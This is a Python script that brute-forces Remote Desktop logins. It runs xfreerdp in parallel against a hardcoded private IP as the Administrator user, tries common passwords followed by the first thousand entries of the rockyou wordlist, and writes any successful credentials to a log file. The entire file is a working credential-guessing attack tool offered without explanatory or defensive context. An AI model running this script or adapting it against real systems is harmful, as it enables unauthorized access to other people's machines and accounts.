import subprocess
from multiprocessing import Pool, Manager, cpu_count
from collections import Counter

# Configuration
target_ip = "192.168.137.128"
username = "Administrator"
rockyou_path = "/usr/share/wordlists/rockyou.txt"
top_n = 1000
success_log = "rdp_success.txt"

# Prepend these most common passwords
common_passwords = [
    "12345", "123456", "123456789", "password", "admin",
    "12345678", "qwerty", "abc123", "password1", "111111"
]

# Get top N from rockyou.txt (in order, not by frequency)
def get_top_rockyou(filepath, top_n):
    with open(filepath, "r", encoding="latin-1", errors="ignore") as f:
        return [line.strip() for _, line in zip(range(top_n), f) if line.strip()]

# Worker function
def attempt_login(password, found_flag):
    if found_flag.value:
        return None

    command = [
        "xfreerdp",
        f"/u:{username}",
        f"/p:{password}",
        f"/v:{target_ip}",
        "/cert:ignore",
        "/log-level:OFF"
    ]
    try:
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=6)
        if b"connected" in result.stdout.lower():
            found_flag.value = True
            print(f"[+] SUCCESS: {username}:{password}")
            with open(success_log, "w") as f:
                f.write(f"{username}:{password}\n")
            return password
    except:
        pass
    return None

# Main
if __name__ == "__main__":
    print(f"[*] Preparing password list...")
    rockyou_passwords = get_top_rockyou(rockyou_path, top_n)
    password_list = common_passwords + rockyou_passwords

    manager = Manager()
    found_flag = manager.Value('b', False)
    pool = Pool(cpu_count() * 2)
    jobs = []

    print(f"[*] Starting brute-force with {len(password_list)} passwords...")

    try:
        for pw in password_list:
            if found_flag.value:
                break
            job = pool.apply_async(attempt_login, args=(pw, found_flag))
            jobs.append(job)

        for job in jobs:
            if found_flag.value:
                break
            result = job.get()
            if result:
                print(f"[+] Cracked: {result}")
                break

    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
    finally:
        pool.terminate()
        pool.join()

    if not found_flag.value:
        print("[-] Password not found.")